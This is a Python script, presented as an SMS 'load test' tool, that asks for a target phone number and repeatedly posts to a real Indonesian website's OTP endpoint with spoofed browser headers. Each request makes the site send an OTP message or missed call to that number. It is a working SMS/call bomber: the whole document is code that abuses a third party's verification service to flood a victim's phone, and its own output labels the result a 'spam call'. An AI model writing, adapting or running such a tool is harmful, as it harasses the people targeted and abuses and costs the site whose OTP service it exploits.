#library python
import json
import os
import sys
import time
import subprocess

# check and install requests
try:
    import requests
except ImportError:
    print("requests library not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

#user interface
os.system('clear')
logo = """
SPAM SMS TOOLS FOR LOAD TEST
Author : Emisi Lab
Team : IDNMAkerspace Algorithma Factory
Github : https://github.com/joeinus134131/

Format phone number must be : 
>> 81234567689
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"""

os.system('clear')
print(logo)

#input data
target = input(" Target Number: ")
iterasi = input(" Iteration : ")
iterasi = int(iterasi)
delay = input(" Delay : ")
delay = int(delay)

# API URL
api_url = "https://www.nutriclub.co.id/otp/?phone=0" + target + "&old_phone=0" + target

# Header API
headers = {
    "Host": "www.nutriclub.co.id",
    "Content-Length": "0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Save-Data": "on",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Origin": "https://www.nutriclub.co.id",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.nutriclub.co.id/account/register",
}

# Iterasi untuk mengirim pesan
for i in range(iterasi):
    response = requests.post(api_url, headers=headers).text
    print("Message iteration -", i)
    print("Sent message ......")
    time.sleep(delay)

#json status
response_json = json.loads(response)
status = response_json.get("StatusMessage")

if status == "Request misscall berhasil":
    print("\n {*} Spam call / Phone Number " + target + " Success \n")
else:
    print("\n {*} Spam has been " + str(iterasi) + "x >> failed; \n")